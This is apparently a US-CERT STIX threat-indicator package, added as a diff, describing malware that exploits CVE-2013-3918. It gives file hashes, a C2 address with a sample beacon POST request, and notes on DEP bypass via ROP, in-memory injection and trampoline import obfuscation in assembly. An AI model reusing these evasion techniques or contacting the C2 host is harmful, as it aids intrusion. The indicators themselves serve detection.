@@ -1,0 +1,158 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" id="CISCP:IB-13-10770" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Code Found in the Wild Contains Logic to Exploit CVE-2013-3918</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 13 November 2013, a piece of code was discovered in the wild. This file revealed code to exploit the vulnerability described in CVE-2013-3918. One (1) hard-coded IP address was discovered during analysis. 
+
+This document incorporates data originally released as US-CERT MIFR-326125.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-11-20T17:40:21Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-dc5e3cd1-0773-4c5c-b34b-1b19efa5c59d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-54102694-290c-4315-829d-91baae8ecb45"/>
+        <indicator:Indicator idref="CISCP:indicator-34a9c3a1-5d67-41d0-8582-94460448d0ef"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-54102694-290c-4315-829d-91baae8ecb45" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The file is an HTML document that is specially crafted to exploit CVE&#8208;2013&#8208;3918 via the InformationCardSigninHelper ActiveX control, {19916E01&#8208;B44E&#8208;4E31&#8208;94A4&#8208;4696DF46157B}. The vulnerability has been addressed by Microsoft in the Microsoft Security Bulletin MS13&#8208;090.
+
+This code runs in memory only and does not write itself to disk, leaving little or no artifacts that can be uesd to identify infected endpoints. This payload is shellcode which is decoded and injected directly into memory after a successful exploitation.
+
+To bypass Data Execution Prevention (DEP), the shellcode uses a sequence of ROP's gadgets from msvcrt.dll to change the memory's protection. After the memory's protection is modified, the shellcode executes rundll32.exe and injects the final payload into the newly spawned process. The injected code undergoes multiple de&#8208;obfuscation routines to unwrap itself. To make sure all the memory references are valid, the malware implemented its own rebasing routine. To rebase, the malware traverses a table of 0x410 addresses and subtracts a value of 0x401000 from the referenced data.
+
+To conceal its logic, the malware uses a trampoline function to redirect the execution path. The trampoline function uses two arrays that keep track of the import modules and their functions. The data structures to keep track of import modules and its APIs is as follows.
+struct ImportEntry{
+void* FunctionAddr;
+char *FunctionName;
+};
+struct ModuleEntry{
+HMODULE ModuleHandle;
+char *ModuleName;
+ImportEntry *ImportsName;
+int NumberOfImports;
+};
+
+To call an import function, the malware indexes into the arrays to get the address of the intended function then jumps into the function. Below is a sample code that calls the "RtlIntitializeCriticalSection" function using the indices.
+
+push 8 ; API index, RtlInitializeCriticalSecion
+push 0 ; Module index, ntdll.dll
+jmp Trampoline
+
+The trampoline code is implemented as followed:
+push ebx ; save ebx
+mov eax, [esp+4] ; Module index
+imul eax, size ModuleEntry
+mov eax, ds:trampoline_table.Imports[eax]
+mov ebx, [esp+8] ; API index
+imul ebx, 8
+add eax, ebx
+mov eax, [eax+ImportEntry.FunctionAddr]
+pop ebx ; restore ebx
+add esp, 8 ; remove the indices from the stack
+jmp eax ; jump to target function
+
+To establish a connection with the C2, the malware attempts to send POSTs requests to a remote Internet Address, 111.68.9.93 via TCP/443.
+
+The malware's full functionality has not been reversed engineered beyond this point.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-a72e7e96-fcc4-4468-b6d0-d031e75c334c">
+        <cybox:Object id="CISCP:Object-c4027371-7dbb-4be0-b0b7-4512d9158427">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">165fb64b2d5377f33855c961ea9341dd8da2</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">95839</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">660ebfb2c3148a0467f658e340849721</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">cca5165fb64b2d5377f33855c961ea9341dd8da2</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">96ebeac79bd167021f3b57a93ce2922d16276e01a4ea9d8a5fdf37f3254e8ffe</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">1536:jFd/+pV564RefRkDvdCdUFd2j/T25z1gyN4JbvgTNUHAl3NvXd2Bi9tF8pcPoTjG:jD+prDRbTdCd6d2j/2IJUiHAlRXd2wae</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-34a9c3a1-5d67-41d0-8582-94460448d0ef" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The malware attempts to send POST requests via TCP/443
+
+---POST REQUEST---
+POST http://111.68.9.93:443/0 HTTP/1.1
+User&#8208;Agent: lynx
+Host: 111.68.9.93:443
+Content&#8208;Length: 104
+Proxy&#8208;Connection: Keep&#8208;Alive
+Pragma: no&#8208;cache
+---END POST REQUEST---
+
+The POST's data is Base64 encoded. It is decoded to reveal the following information:
+0000000: a280 0f74 a280 0f74 a280 0f74 a280 0f74 ...t...t...t...t
+0000010: ab92 1e54 a280 0f74 a280 0f74 a280 0f74 ...T...t...t...t
+0000020: a280 0f74 a280 0f74 a280 0f74 a280 0f74 ...t...t...t...t
+0000030: a280 0f74 a280 0f74 a280 0f74 a280 0f74 ...t...t...t...t
+0000040: a280 0f74 a280 0f74 a280 0f74           ...t...t...t
+
+Frequency analysis revealed the key is 0xa2800f74 (big endian). XOR algorithm is applied to reveal the following data:
+0000000: 0000 0000 0000 0000 0000 0000 0000 0000 ................
+0000010: 0912 1120 0000 0000 0000 0000 0000 0000 ... ............
+0000020: 0000 0000 0000 0000 0000 0000 0000 0000 ................
+0000030: 0000 0000 0000 0000 0000 0000 0000 0000 ................
+0000040: 0000 0000 0000 0000 0000 0000 ............
+
+From network capture, The POST's data is encoded with random 4&#8208;byte key which can be revealed using frequency analysis.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-6f03a05e-c787-4e83-ae9d-f0761a6d4c9c">
+        <cybox:Object id="CISCP:Object-3beef8ae-3bfe-41bb-a619-c16707d07971">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">111.68.9.93</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
